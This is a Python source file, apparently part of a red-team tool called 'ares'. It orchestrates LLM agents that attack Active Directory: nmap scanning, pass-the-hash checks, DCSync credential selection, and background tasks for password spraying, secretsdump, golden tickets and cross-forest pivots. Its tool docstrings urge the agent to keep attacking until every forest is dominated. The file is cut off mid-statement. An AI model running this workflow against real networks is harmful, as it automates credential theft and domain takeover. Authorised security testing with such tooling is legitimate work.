"""Main orchestrator for multi-agent red team operations.

This module provides the entry point for coordinating multi-agent
red team operations in a Kubernetes environment.
"""

from __future__ import annotations

import asyncio
import hashlib
import os
import re
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import dreadnode as dn
import rigging as rg
from dreadnode.agent import Agent, Thread
from dreadnode.agent.stop import tool_use
from loguru import logger
from tenacity import (
    AsyncRetrying,
    retry_if_exception_type,
    stop_after_attempt,
    wait_random_exponential,
)

from ares.core.config import (
    get_agent_config,
    get_crack_task_grace_period,
    get_max_runtime,
    get_multi_forest_mode,
    get_namespace,
    get_rate_limit_backoff_delays,
    get_rate_limit_max_retries,
    get_redis_url,
    get_stop_on_domain_admin,
)
from ares.core.dispatcher import RedTeamDispatcher
from ares.core.factories.red_agents import (
    create_role_hooks,
    load_agent_instructions,
)
from ares.core.models import (
    AgentInfo,
    AgentRole,
    Credential,
    Host,
    SharedRedTeamState,
    Target,
    TaskStatus,
)
from ares.core.persistent_store import PersistentStore, get_persistent_store_config
from ares.core.recovery import OperationRecoveryManager, RecoveryError
from ares.core.task_queue import RedisTaskQueue
from ares.core.workflows import exploitation_workflow
from ares.reports.redteam import RedTeamReportGenerator
from ares.tools.red.orchestrator import OrchestratorTools


def _resolve_model_generator(model: str, openai_api_key: str | None) -> str | rg.Generator:
    if not openai_api_key:
        return model
    if not model.startswith(("gpt-", "openai/")):
        return model
    try:
        generator = rg.get_generator(model)
    except Exception:
        return model
    if hasattr(generator, "api_key"):
        generator.api_key = openai_api_key
    return generator


def _resolve_orchestrator_model(model: str | None) -> str:
    resolved = model or os.getenv("ARES_ORCHESTRATOR_MODEL") or os.getenv("ARES_MODEL")
    if not resolved:
        raise ValueError(
            "No model specified for operation. Provide a model argument or set "
            "ARES_ORCHESTRATOR_MODEL/ARES_MODEL in the environment."
        )
    return resolved


async def _async_run_tool(*args: Any, **kwargs: Any) -> tuple[str, str, int]:
    """Run a tool command without blocking the asyncio event loop.

    Wraps the synchronous run_tool() in asyncio.to_thread() so that other
    coroutines (background tasks, health checks, etc.) can continue while
    the tool executes on a worker pod.
    """
    from ares.tools.red.common import run_tool

    return await asyncio.to_thread(run_tool, *args, **kwargs)


def _is_pass_the_hash_compatible(hash_value: str, hash_type: str | None) -> bool:
    if not hash_value:
        return False
    normalized_type = (hash_type or "").strip().upper()
    if normalized_type and normalized_type not in {"NTLM", "LM", "NTLMV1", "NTLMV2"}:
        return False
    value = hash_value.strip()
    if "$" in value:
        return False
    if ":" in value:
        parts = value.split(":")
        if len(parts) != 2:
            return False
        lm_part, ntlm_part = parts
        if lm_part and not re.fullmatch(r"[0-9a-fA-F]{32}", lm_part):
            return False
        return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))


def _is_valid_secret_candidate(value: str | None) -> bool:
    """Reject obvious parser/tool artifacts before scheduling auth attempts."""
    if not value:
        return False
    normalized = value.strip().lower()
    if not normalized:
        return False
    invalid_markers = (
        "separator unmatched",
        "saving ticket in",
        "maximum steps reached",
        "command timed out",
        "traceback",
        ".ccache",
        "golden_ticket",
    )
    return not any(marker in normalized for marker in invalid_markers)


def _can_attempt_foreign_dcsync(state: SharedRedTeamState, username: str, domain: str) -> bool:
    """Check if a credential should be tried for foreign DCSync.

    For foreign (undominated) domains, we're more permissive: if we have no admin
    info at all for the domain, try all credentials. The cost of a failed secretsdump
    is just a timeout, while missing a DA credential means never dominating the forest.
    """
    normalized_user = (username or "").strip().lower()
    normalized_domain = (domain or "").strip().lower()
    if not normalized_user or not normalized_domain:
        return False

    # Always try well-known admin accounts
    if normalized_user in {"administrator", "krbtgt"}:
        return True

    cred_key = f"{normalized_domain}:{normalized_user}"
    if cred_key in state.golden_ticket_capable_creds:
        return True

    # Check if explicitly marked as admin
    for cred in state.all_credentials:
        if (
            cred.username.lower() == normalized_user
            and (cred.domain or "").lower() == normalized_domain
            and cred.is_admin
        ):
            return True

    for user in state.all_users:
        if (
            user.username.lower() == normalized_user
            and (user.domain or "").lower() == normalized_domain
            and user.is_admin
        ):
            return True

    # For undominated foreign domains with no admin info, try all credentials.
    # This handles cases like daenerys.targaryen being DA but not flagged as admin.
    if normalized_domain in [d.lower() for d in state.get_undominated_forests()]:
        # Check if we have ANY admin info for this domain
        has_any_admin_info = any(
            (c.domain or "").lower() == normalized_domain and c.is_admin
            for c in state.all_credentials
        ) or any(
            (u.domain or "").lower() == normalized_domain and u.is_admin for u in state.all_users
        )
        if not has_any_admin_info:
            # No admin info at all — try all creds (dedup will prevent retries)
            return True

    return False


async def _wait_for_required_workers(
    dispatcher: RedTeamDispatcher,
    required_roles: list[str],
    timeout: float = 120.0,
) -> bool:
    """
    Wait for required worker agents to come online.

    Args:
        dispatcher: The dispatcher instance
        required_roles: List of roles that must be online (e.g., ["recon"])
        timeout: Maximum time to wait in seconds

    Returns:
        True if all required workers came online, False if timeout
    """
    import time

    start = time.time()

    logger.info(f"Waiting for required workers: {required_roles}")

    while time.time() - start < timeout:
        status = dispatcher.get_agent_status()
        online_roles = {
            info["role"] for name, info in status.items() if info["status"] != "offline"
        }

        missing = set(required_roles) - online_roles
        if not missing:
            logger.success(f"All required workers online: {required_roles}")
            return True

        elapsed = time.time() - start
        logger.debug(f"Waiting for workers: {missing} (elapsed: {elapsed:.0f}s)")
        await asyncio.sleep(5)

    logger.error(
        f"Timeout waiting for workers after {timeout}s. "
        f"Missing: {set(required_roles) - online_roles}"
    )
    return False


async def _load_or_initialize_state(
    dispatcher: RedTeamDispatcher,
    recovery: OperationRecoveryManager,
    operation_id: str,
    resume_from_checkpoint: bool,
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None,
    target_environment: str | None = None,
) -> None:
    if resume_from_checkpoint:
        try:
            state, requeued_task_ids = await recovery.recover_operation(operation_id)
            dispatcher._shared_state = state
            # Requeued tasks are already in pending_tasks (restored from checkpoint)
            # which the result consumer polls automatically
            if requeued_task_ids:
                logger.info(f"Recovered {len(requeued_task_ids)} pending tasks from checkpoint")
            if state.all_credentials or state.all_hashes:
                dispatcher.signal_credential_access()
            logger.info(f"Resumed operation {operation_id} from checkpoint")
            return
        except RecoveryError:
            logger.warning(f"No checkpoint found for {operation_id}, starting fresh")

    state = dispatcher.shared_state
    # Enable real-time publishing of discoveries to Redis
    state.set_dispatcher(dispatcher)
    state.target = Target(
        ip=target_ips[0] if target_ips else "",
        domain=target_domain,
        environment=target_environment or "",
    )
    if target_domain:
        state.add_domain(target_domain)

    # Add all target IPs as placeholder hosts so scanners can track them
    # Services will be merged when recon discovers them
    for ip in target_ips:
        placeholder_host = Host(ip=ip, hostname="", os="Unknown", roles=[], services=[])
        state.add_host(placeholder_host)
    if target_ips:
        logger.info(f"Added {len(target_ips)} target IPs as placeholder hosts")

    if initial_credential:
        state.add_credential(initial_credential, "initial")
        dispatcher.signal_credential_access()


async def _register_agents(
    dispatcher: RedTeamDispatcher,
    agents: dict[AgentRole, AgentInfo],
) -> None:
    for agent_info in agents.values():
        await dispatcher.register(agent_info)


async def _ensure_required_workers(
    dispatcher: RedTeamDispatcher,
    required_roles: list[str],
    timeout: float = 120.0,
) -> None:
    if not await _wait_for_required_workers(dispatcher, required_roles, timeout=timeout):
        raise RuntimeError(
            f"Required workers ({', '.join(required_roles)}) did not come online within "
            f"{timeout:.0f} seconds. Ensure worker pods are deployed and running."
        )


def _parse_nmap_report_header(host_line: str) -> tuple[str, str]:
    """Parse IP and hostname from nmap report header line."""
    ip_match = re.match(r"(.+) \((\d+\.\d+\.\d+\.\d+)\)$", host_line)
    if ip_match:
        return ip_match.group(2), ip_match.group(1).strip()
    ip_only = re.match(r"^(\d+\.\d+\.\d+\.\d+)$", host_line)
    if ip_only:
        return ip_only.group(1), ""
    return "", host_line


def _parse_nmap_service_line(line: str, current: dict) -> None:
    """Parse service/port line and update current host dict."""
    svc_match = re.match(r"^(\d+)/(tcp|udp)\s+open\s+([^\s]+)", line)
    if svc_match:
        current["services"].append(
            f"{svc_match.group(1)}/{svc_match.group(2)} {svc_match.group(3)}"
        )
    domain_match = re.search(r"\(Domain:\s*([^,)]+)", line)
    if domain_match and not current["domain"]:
        current["domain"] = domain_match.group(1).strip()
    if "Service Info:" in line:
        host_match = re.search(r"Host:\s*([^;]+)", line)
        if host_match:
            current["hostname"] = host_match.group(1).strip()
        os_match = re.search(r"OS:\s*([^;]+)", line)
        if os_match and not current["os"]:
            current["os"] = os_match.group(1).strip()


def _build_host_from_nmap(current: dict) -> Host | None:
    """Build Host object from parsed nmap data."""
    if not current["ip"]:
        return None
    hostname = current["hostname"]
    # NOTE: Do NOT join short hostname with nmap's (Domain:...) to build FQDN.
    # nmap's LDAP probe reports the forest root domain (e.g., "contoso.local")
    # even for child domain DCs (e.g., ws01 belongs to "child.contoso.local").
    # Joining produces wrong FQDNs like "ws01.contoso.local".
    # The correct FQDN will be discovered by netexec SMB which reports the actual domain,
    # and merged via add_host()'s hostname upgrade logic.
    services_lower = [s.lower() for s in current["services"]]
    is_dc = any("ldap" in s for s in services_lower) and any(
        "kerberos" in s for s in services_lower
    )
    host = Host(
        ip=current["ip"],
        hostname=hostname,
        os=current["os"] or "Unknown",
        roles=["AD DC"] if is_dc else [],
        services=current["services"],
    )
    if is_dc:
        host.is_dc = True
    return host


def _parse_nmap_hosts(output: str) -> list[Host]:
    """Parse nmap output into Host objects."""
    hosts: list[Host] = []
    current = {"ip": "", "hostname": "", "os": "", "domain": "", "services": []}

    for raw_line in output.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        report_match = re.match(r"^Nmap scan report for (.+)$", line)
        if report_match:
            host = _build_host_from_nmap(current)
            if host:
                hosts.append(host)
            current["ip"], current["hostname"] = _parse_nmap_report_header(report_match.group(1))
            current["os"], current["domain"], current["services"] = "", "", []
        elif current["ip"]:
            _parse_nmap_service_line(line, current)

    host = _build_host_from_nmap(current)
    if host:
        hosts.append(host)
    return hosts


async def _run_nmap_on_worker(targets: list[str], namespace: str) -> tuple[str, list[Host]]:
    """Run nmap on a recon worker pod via kubectl exec.

    Three-phase scan:
    1. Fast port discovery (top 100 ports)
    2. Service version detection on discovered ports
    3. NetBIOS hostname enrichment for hosts without hostnames
    """
    from ares.core.k8s_executor import KubernetesPodExecutor

    if not targets:
        return "", []

    executor = KubernetesPodExecutor(namespace=namespace, in_cluster=True)

    logger.info(f"[DIRECT NMAP] Phase 1: Fast port discovery on {len(targets)} targets")

    # Phase 1: Fast port scan
    port_cmd = ["nmap", "-Pn", "-sT", "-T4", "--open", "--top-ports", "100"] + targets
    try:
        stdout, stderr, returncode = await executor.execute(
            role="recon", command=port_cmd, timeout_seconds=120
        )
        if returncode != 0:
            logger.warning(f"[DIRECT NMAP] Port scan failed: {stderr[:200]}")
            return stderr, []
        port_output = stdout
    except Exception as e:
        logger.warning(f"[DIRECT NMAP] Port scan error: {e}")
        return str(e), []

    # Parse open ports
    open_ports = set()
    for match in re.finditer(r"(\d+)/tcp\s+open", port_output):
        open_ports.add(match.group(1))

    if not open_ports:
        logger.info("[DIRECT NMAP] No open ports found")
        hosts = _parse_nmap_hosts(port_output)
        return port_output, hosts

    ports_str = ",".join(sorted(open_ports, key=int))
    logger.info(f"[DIRECT NMAP] Phase 2: Service detection on {len(open_ports)} ports: {ports_str}")

    # Phase 2: Service version detection
    svc_cmd = ["nmap", "-Pn", "-sT", "-T4", "--open", "-sV", "-p", ports_str] + targets
    try:
        stdout, stderr, returncode = await executor.execute(
            role="recon", command=svc_cmd, timeout_seconds=300
        )
        if returncode != 0:
            logger.warning(f"[DIRECT NMAP] Service scan had issues: {stderr[:200]}")
            # Use port scan results
            hosts = _parse_nmap_hosts(port_output)
            return port_output, hosts
        svc_output = stdout
    except Exception as e:
        logger.warning(f"[DIRECT NMAP] Service scan error: {e}, using port scan results")
        hosts = _parse_nmap_hosts(port_output)
        return port_output, hosts

    logger.info(f"[DIRECT NMAP] Scan completed for {len(targets)} targets")
    hosts = _parse_nmap_hosts(svc_output)

    # Phase 3: NetBIOS hostname enrichment for hosts without hostnames
    hosts_needing_enrichment = [
        h
        for h in hosts
        if not h.hostname
        or (h.hostname.lower().startswith("ip-") and "compute.internal" in h.hostname.lower())
    ]
    if hosts_needing_enrichment:
        logger.info(
            f"[DIRECT NMAP] Phase 3: NetBIOS hostname resolution for "
            f"{len(hosts_needing_enrichment)} host(s)"
        )
        for host in hosts_needing_enrichment:
            try:
                # Use nmap nbstat script for NetBIOS name resolution
                nbstat_cmd = ["nmap", "-Pn", "-sU", "-p", "137", "--script", "nbstat", host.ip]
                nb_stdout, _nb_stderr, nb_rc = await executor.execute(
                    role="recon", command=nbstat_cmd, timeout_seconds=15
                )
                if nb_rc == 0 and nb_stdout:
                    # Parse FQDN from "Nmap scan report for hostname.domain (IP)"
                    fqdn_match = re.search(
                        r"Nmap scan report for ([^\s]+)\s+\(" + re.escape(host.ip) + r"\)",
                        nb_stdout,
                    )
                    if fqdn_match:
                        resolved_hostname = fqdn_match.group(1).strip()
                        # Skip AWS internal hostnames
                        if not (
                            resolved_hostname.lower().startswith("ip-")
                            and "compute.internal" in resolved_hostname.lower()
                        ):
                            host.hostname = resolved_hostname
                            logger.info(
                                f"[DIRECT NMAP] Resolved hostname for {host.ip}: {resolved_hostname}"
                            )
                            continue

                    # Fallback: parse NetBIOS name from nbstat output
                    # NOTE: We only use the NetBIOS hostname, not the domain group name.
                    # Constructing FQDNs like "{netbios}.{domain}.local" is wrong because
                    # we don't know the actual domain suffix (e.g., "child" could be
                    # "child.contoso.local", not "child.local"). The actual FQDN
                    # will be discovered via DNS/LDAP enumeration.
                    nb_match = re.search(r"nbstat:\s*NetBIOS name:\s*([^,]+)", nb_stdout)
                    if nb_match:
                        netbios_name = nb_match.group(1).strip()
                        host.hostname = netbios_name.lower()
                        logger.info(
                            f"[DIRECT NMAP] Resolved NetBIOS name for {host.ip}: {host.hostname}"
                        )
            except Exception as e:
                logger.debug(f"[DIRECT NMAP] NetBIOS resolution failed for {host.ip}: {e}")

    return svc_output, hosts


async def _run_direct_nmap(
    state: SharedRedTeamState,
    target_ips: list[str],
    namespace: str,
) -> None:
    """Run nmap directly (not via LLM task queue) and add hosts to state.

    This runs BEFORE the LLM orchestrator starts, ensuring host discovery
    doesn't get stuck behind slow LLM-guided tasks in the worker queue.
    Uses kubectl exec to run nmap on a recon worker pod.
    """
    if not target_ips:
        return

    # Filter already-scanned targets
    unscanned = [ip for ip in target_ips if ip not in state.scanned_targets]
    if not unscanned:
        logger.info(f"[DIRECT NMAP] All {len(target_ips)} targets already scanned")
        return

    logger.info(f"[DIRECT NMAP] Running nmap via kubectl exec on {len(unscanned)} targets")

    try:
        _output, hosts = await _run_nmap_on_worker(unscanned, namespace)
    except Exception as e:
        logger.warning(f"[DIRECT NMAP] Failed to run nmap: {e}")
        return

    # Add hosts to state
    for host in hosts:
        state.add_host(host)

    # Mark targets as scanned
    for ip in unscanned:
        state.scanned_targets.add(ip)

    # Persist to backend if available
    if state._backend:
        try:
            await state._backend.set_meta("nmap_completed", "true")
        except Exception as e:
            logger.warning(f"[DIRECT NMAP] Failed to persist nmap completion: {e}")

    dc_count = sum(1 for h in hosts if h.is_dc)
    logger.success(
        f"[DIRECT NMAP] Discovered {len(hosts)} hosts ({dc_count} DCs) "
        f"from {len(unscanned)} targets"
    )


async def _prime_operation(
    recovery: OperationRecoveryManager,
    dispatcher: RedTeamDispatcher,
    target_ips: list[str],
    target_domain: str,
) -> None:
    """Initialize operation state in Redis so workers can discover it.

    With Redis-native state backend, state persists immediately on mutation.
    This function writes initial metadata to mark the operation as active,
    including setting the active operation pointer for worker discovery.
    """
    state = dispatcher.shared_state
    operation_id = state.operation_id
    if state._backend:
        # Set started_at timestamp so workers can determine operation freshness
        now = datetime.now(timezone.utc)
        await state._backend.set_meta("started_at", now.isoformat())
        await state._backend.set_meta("initialized", value=True)

        # Store target info so CLI can reconstruct state
        if target_ips:
            await state._backend.set_meta("target_ip", target_ips[0])
            await state._backend.set_meta("target_ips", ",".join(target_ips))
        if target_domain:
            await state._backend.set_meta("target_domain", target_domain)
        # Persist target environment from state (set in _load_or_initialize_state)
        if state.target and state.target.environment:
            await state._backend.set_meta("target_environment", state.target.environment)

        # Set the active operation pointer for worker discovery
        # This allows workers to find the operation immediately via the pointer
        # instead of scanning and potentially rejecting based on stale timestamps
        try:
            await state._backend._redis.set("ares:op:active", operation_id)
            logger.info(f"Set active operation pointer: {operation_id}")
        except Exception as e:
            logger.warning(f"Failed to set active operation pointer: {e}")

        logger.info("Operation state initialized in Redis - workers can discover operation")
    else:
        logger.warning("No state backend configured - operation may not be discoverable")

    # NOTE: NMAP and immediate AS-REP dispatch moved to run_multi_agent_operation()
    # before background tasks are created, to prevent race conditions


def _is_rate_limit_error(error: Exception | str) -> bool:
    """Check if error is a rate limit error that should be retried quickly."""
    error_str = str(error).lower()
    return any(
        pattern in error_str
        for pattern in [
            "rate limit",
            "ratelimit",
            "rate_limit",
            "too many requests",
            "429",
            "tokens per min",
            "tpm",
            "requests per min",
            "rpm",
        ]
    )


def _log_orchestrator_result(result: rg.RunResult, model: str) -> None:
    logger.success(
        f"✅ Model connection successful: {model} "
        f"(messages: {len(result.messages)}, tokens: {result.usage})"
    )
    log_fn = logger.error if result.stop_reason == "error" else logger.success
    log_msg = (
        f"Orchestrator failed after {result.steps} steps: {result.error}"
        if result.stop_reason == "error"
        else f"Orchestrator completed: {result.steps} steps, {result.stop_reason}"
    )
    log_fn(log_msg)


def _create_completion_tools(
    shared_state: SharedRedTeamState,
    dispatcher: RedTeamDispatcher,
) -> tuple[Any, Any]:
    """
    Create the completion tools that can access shared state.

    These tools are used as stop conditions for the orchestrator agent.
    They need to modify the shared state, so we create them as closures.

    Returns:
        Tuple of (complete_operation, announce_domain_admin) tools
    """

    @dn.tool
    def complete_operation(summary: str) -> str:
        """
        Mark the multi-agent red team operation as complete.

        Use this tool when you have:
        - Achieved domain admin access OR exhausted all attack paths
        - Coordinated with all specialized agents
        - Collected all available credentials and hashes
        - Generated golden ticket (if krbtgt hash was found)

        Args:
            summary: Executive summary of the operation including:
                - All domain administrators compromised
                - Attack paths used
                - Total credentials obtained
                - Hosts compromised
                - Key vulnerabilities exploited

        Returns:
            Confirmation message

        Example:
            >>> complete_operation("Domain admin achieved via ADCS ESC1...")
        """
        # In multi-forest mode, prevent premature completion when foreign
        # domains haven't been discovered yet.  After DA, agents may still
        # be running MSSQL / trust enumeration that would reveal new forests.
        if get_multi_forest_mode() and shared_state.has_domain_admin:
            if shared_state.all_forests_dominated():
                # Check if there are still pending/running tasks that could
                # discover foreign hosts (MSSQL exploits, trust enum, recon)
                pending_count = len(shared_state.pending_tasks)
                if pending_count > 0:
                    logger.warning(
                        f"🌲 Multi-forest mode: {pending_count} task(s) still running — "
                        f"delaying completion to allow foreign domain discovery"
                    )
                    return (
                        f"⚠️ Cannot complete yet: multi_forest_mode is enabled and "
                        f"{pending_count} tasks are still running that may discover "
                        f"foreign domains. Wait for tasks to finish, then retry."
                    )
            else:
                undominated = shared_state.get_undominated_forests()
                logger.warning(
                    f"🌲 Multi-forest mode: refusing completion — "
                    f"undominated forests: {undominated}"
                )
                return (
                    f"⚠️ Cannot complete: multi_forest_mode is enabled and these "
                    f"forests are NOT dominated yet: {undominated}. "
                    f"Continue attacking these domains before completing."
                )

        shared_state.completed = True
        logger.success(f"🎯 Multi-agent operation completed: {summary}")
        return f"✓ Operation marked as complete. Summary: {summary}"

    @dn.tool
    async def announce_domain_admin(
        domain: str,
        username: str,
        credential_type: str,
        attack_path: str,
    ) -> str:
        """
        Announce successful achievement of Domain Admin privileges.

        Use this tool when you have confirmed Domain Admin access through:
        - Valid DA credentials (password or hash)
        - Forged Golden Ticket with krbtgt hash
        - Successful DA-level command execution (e.g., DCSync, remote code execution on DC)

        Args:
            domain: Target domain name
            username: Domain Admin username achieved
            credential_type: Type of credential (password, hash, golden_ticket)
            attack_path: Brief description of the attack path used to achieve DA

        Returns:
            Confirmation message

        Example:
            >>> await announce_domain_admin(
            ...     domain="contoso.local",
            ...     username="Administrator",
            ...     credential_type="password",
            ...     attack_path="ADCS ESC1 exploit -> cert auth"
            ... )
        """
        await dispatcher.announce_domain_admin(
            username=username,
            domain=domain,
            attack_path=attack_path,
            credential_type=credential_type,
            source_agent="ares-orchestrator",
        )
        logger.success(
            f"🎯 DOMAIN ADMIN ACHIEVED! Domain: {domain}, User: {username}, "
            f"Type: {credential_type}, Path: {attack_path}"
        )
        return (
            f"✓ Domain Admin access confirmed for {domain}\\{username} "
            f"via {credential_type} (attack path: {attack_path})"
        )

    return complete_operation, announce_domain_admin


async def run_multi_agent_operation(
    operation_id: str,
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None = None,
    resume_from_checkpoint: bool = False,
    redis_url: str | None = None,
    namespace: str | None = None,
    model: str | None = None,
    max_steps: int = 200,
    checkpoint_interval: int = 60,
    openai_api_key: str | None = None,
    report_dir: str | Path | None = None,
    max_runtime: float | None = None,
    target_environment: str | None = None,
) -> dict[str, Any]:
    """
    Main entry point for multi-agent red team operations.

    Args:
        operation_id: Unique identifier for this operation
        target_domain: Target domain (e.g., "contoso.local")
        target_ips: List of target IPs to scan
        initial_credential: Optional initial credential
        resume_from_checkpoint: Resume from previous checkpoint
        redis_url: Redis URL for state persistence (default: derived from config)
        namespace: Kubernetes namespace (default: from config)
        model: LLM model to use
        max_steps: Maximum agent steps
        checkpoint_interval: Seconds between checkpoints
        openai_api_key: Optional OpenAI API key to bind directly to the generator
        report_dir: Directory to write the final report (default: ./reports)
        max_runtime: Maximum runtime in seconds (default: 1800s / 30 min, via ARES_MAX_RUNTIME env)
        target_environment: Target environment for tracing (e.g., "dev", "staging", "prod")

    Returns:
        Operation results summary
    """
    # Apply rigging patches for case-insensitive tool parameters
    from ares.core.rigging_patches import apply as apply_rigging_patches

    apply_rigging_patches()

    # Initialize replay system if configured
    from ares.core.config import (
        get_replay_fallback,
        get_replay_file,
        get_replay_mode,
        get_replay_seed,
    )
    from ares.core.replay import initialize_replay

    replay_mode = get_replay_mode()
    if replay_mode:
        replay_file = get_replay_file()
        if replay_file:
            from pathlib import Path

            base_path = Path(replay_file).parent
            base_path.mkdir(parents=True, exist_ok=True)
            replay_file = str(base_path / "orchestrator.jsonl")

        initialize_replay(
            mode=replay_mode,
            path=replay_file,
            seed=get_replay_seed(),
            fallback=get_replay_fallback(),
        )

    # Resolve max runtime from parameter, env, or default
    resolved_max_runtime = max_runtime if max_runtime is not None else get_max_runtime()
    # Resolve config defaults
    redis_url = redis_url or get_redis_url()
    namespace = namespace or get_namespace()
    model = _resolve_orchestrator_model(model)

    start_time = datetime.now(timezone.utc)

    # Initialize infrastructure
    dispatcher = RedTeamDispatcher(redis_url=redis_url)
    await dispatcher.start(operation_id)

    # Acquire exclusive operation lock
    # Force acquire when resuming from checkpoint (stale lock from crashed orchestrator)
    task_queue = RedisTaskQueue(redis_url)
    await task_queue.connect()

    if not await task_queue.acquire_operation_lock(operation_id, force=resume_from_checkpoint):
        await task_queue.disconnect()
        raise RuntimeError(
            f"Operation {operation_id} is already running by another orchestrator. "
            "Use a different operation_id or wait for the existing operation to complete."
        )

    recovery = OperationRecoveryManager(
        redis_url=redis_url,
        checkpoint_interval=checkpoint_interval,
    )
    await recovery.start()

    # Resume or create new operation
    await _load_or_initialize_state(
        dispatcher=dispatcher,
        recovery=recovery,
        operation_id=operation_id,
        resume_from_checkpoint=resume_from_checkpoint,
        target_domain=target_domain,
        target_ips=target_ips,
        initial_credential=initial_credential,
        target_environment=target_environment,
    )

    agents = await _create_agent_ensemble(
        dispatcher=dispatcher,
        model=model,
        max_steps=max_steps,
        namespace=namespace,
    )

    # Register all agents with dispatcher
    await _register_agents(dispatcher, agents)

    # Wait for required workers before starting
    await _ensure_required_workers(dispatcher, ["recon"], timeout=120.0)

    # Run NMAP to discover hosts before background tasks start
    state = dispatcher.shared_state
    if target_ips:
        namespace = get_namespace()
        await _run_direct_nmap(state, target_ips, namespace)

    # Start background tasks
    # - Credential access (AS-REP, password spray, etc.) handled by _auto_credential_access
    # - No periodic checkpoint needed - state persists directly to Redis via RedisStateBackend
    tasks = [
        asyncio.create_task(_monitor_agent_health(dispatcher), name="health_monitor"),
        asyncio.create_task(exploitation_workflow(dispatcher), name="exploitation_workflow"),
        asyncio.create_task(_extend_operation_lock(task_queue, operation_id), name="lock_extender"),
        asyncio.create_task(
            _auto_credential_expansion(dispatcher), name="auto_credential_expansion"
        ),
        asyncio.create_task(_auto_credential_access(dispatcher), name="auto_credential_access"),
        asyncio.create_task(_auto_crack_dispatch(dispatcher), name="auto_crack_dispatch"),
        asyncio.create_task(_auto_mssql_detection(dispatcher), name="auto_mssql_detection"),
        asyncio.create_task(_auto_adcs_enumeration(dispatcher), name="auto_adcs_enumeration"),
        asyncio.create_task(_auto_share_spider(dispatcher), name="auto_share_spider"),
        asyncio.create_task(_auto_bloodhound(dispatcher), name="auto_bloodhound"),
        asyncio.create_task(_auto_coercion(dispatcher), name="auto_coercion"),
        asyncio.create_task(
            _auto_delegation_enumeration(dispatcher), name="auto_delegation_enumeration"
        ),
        asyncio.create_task(
            _auto_local_admin_secretsdump(dispatcher), name="auto_local_admin_secretsdump"
        ),
        asyncio.create_task(_auto_golden_ticket(dispatcher), name="auto_golden_ticket"),
        asyncio.create_task(_auto_foreign_dcsync(dispatcher), name="auto_foreign_dcsync"),
        asyncio.create_task(_auto_cross_forest_pivot(dispatcher), name="auto_cross_forest_pivot"),
        asyncio.create_task(_auto_acl_chain_follow(dispatcher), name="auto_acl_chain_follow"),
    ]

    # Build initial prompt for orchestrator
    initial_prompt = _build_orchestrator_prompt(
        target_domain=target_domain,
        target_ips=target_ips,
        initial_credential=initial_credential,
    )

    try:
        # Do initial checkpoint so workers can discover the operation.
        await _prime_operation(recovery, dispatcher, target_ips, target_domain)

        # Check if DA was already achieved (e.g., recovery after restart) and should stop
        # These modes are mutually exclusive (validated in config)
        if dispatcher.shared_state.has_domain_admin:
            from ares.core.config import get_multi_forest_mode

            if get_stop_on_domain_admin():
                # Single-domain mode: stop on first DA
                logger.info("DA already achieved and stop_on_domain_admin=True; marking complete")
                dispatcher.shared_state.completed = True
                await dispatcher._checkpoint()
            elif get_multi_forest_mode():
                # Multi-forest mode: only stop if ALL forests are dominated
                if dispatcher.shared_state.all_forests_dominated():
                    logger.info(
                        "DA achieved on all forests and multi_forest_mode=True; marking complete"
                    )
                    dispatcher.shared_state.completed = True
                    await dispatcher._checkpoint()
                else:
                    undominated = dispatcher.shared_state.get_undominated_forests()
                    logger.info(
                        f"DA achieved but multi_forest_mode=True - "
                        f"{len(undominated)} forest(s) remaining: {undominated}"
                    )

        # Create the orchestrator agent with tools
        orchestrator_agent = await _create_orchestrator_agent(
            dispatcher=dispatcher,
            model=model,
            max_steps=max_steps,
            openai_api_key=openai_api_key,
        )

        logger.info(f"Starting orchestrator for {target_domain}")
        logger.info(f"Initial prompt:\n{initial_prompt}")

        # NOTE: Initial reconnaissance is dispatched by the orchestrator agent
        # through its template instructions (dispatch_recon). The orchestrator
        # coordinates all work through dispatch tools, not direct execution.

        # Run the orchestrator agent - this drives the entire operation
        # Track crash and rate limit attempts to prevent infinite loops
        orchestrator_crash_count = 0
        max_orchestrator_crashes = 3
        rate_limit_count = 0
        rate_limit_max_retries = get_rate_limit_max_retries()
        rate_limit_delays = get_rate_limit_backoff_delays()
        redis_retry_count = 0
        max_redis_retries = 5
        result = None

        with dn.run(tags=["multi-agent-operation", target_domain]):
            dn.log_params(
                model=model,
                operation_id=operation_id,
                target_domain=target_domain,
                target_ips=target_ips,  # type: ignore[arg-type]
                max_steps=max_steps,
            )

            # Run the orchestrator agent with crash and rate limit recovery
            while orchestrator_crash_count < max_orchestrator_crashes:
                try:
                    logger.info(f"🤖 Connecting to {model}...")
                    result = await orchestrator_agent.run(initial_prompt)
                    _log_orchestrator_result(result, model)

                    # Check if result indicates a fatal error (e.g., auth failure)
                    if result.stop_reason == "error":
                        error_msg = str(result.error) if result.error else "Unknown error"
                        # Auth errors are fatal - no point retrying with bad credentials
                        if "AuthenticationError" in error_msg or "invalid" in error_msg.lower():
                            raise RuntimeError(f"Fatal authentication error: {error_msg}")
                        # Rate limit errors in result - handle inline to avoid extra exception
                        if _is_rate_limit_error(error_msg):
                            rate_limit_count += 1
                            if rate_limit_count <= rate_limit_max_retries:
                                delay_idx = min(rate_limit_count - 1, len(rate_limit_delays) - 1)
                                delay = rate_limit_delays[delay_idx]
                                logger.warning(
                                    f"⏳ Rate limit in result "
                                    f"(attempt {rate_limit_count}/{rate_limit_max_retries}), "
                                    f"backing off {delay}s: {error_msg}"
                                )
                                await asyncio.sleep(delay)
                                continue  # Retry without incrementing crash count
                        # Other errors - treat as crash and let retry logic handle
                        raise RuntimeError(f"Orchestrator returned error: {error_msg}")

                    break  # Success - exit the retry loop
                except Exception as e:
                    error_str = str(e)

                    # Auth errors are fatal - never retry with bad credentials
                    if (
                        "Fatal authentication error" in error_str
                        or "AuthenticationError" in error_str
                    ):
                        logger.error(f"Authentication failed - cannot continue: {e}")
                        raise

                    # Rate limit errors get special treatment with fast retry
                    # They should be retried even without progress since they're transient
                    if _is_rate_limit_error(e):
                        rate_limit_count += 1
                        if rate_limit_count <= rate_limit_max_retries:
                            # Use shorter backoff for rate limits (default: 1, 2, 4 seconds)
                            delay_idx = min(rate_limit_count - 1, len(rate_limit_delays) - 1)
                            delay = rate_limit_delays[delay_idx]
                            logger.warning(
                                f"⏳ Rate limit hit (attempt {rate_limit_count}/{rate_limit_max_retries}), "
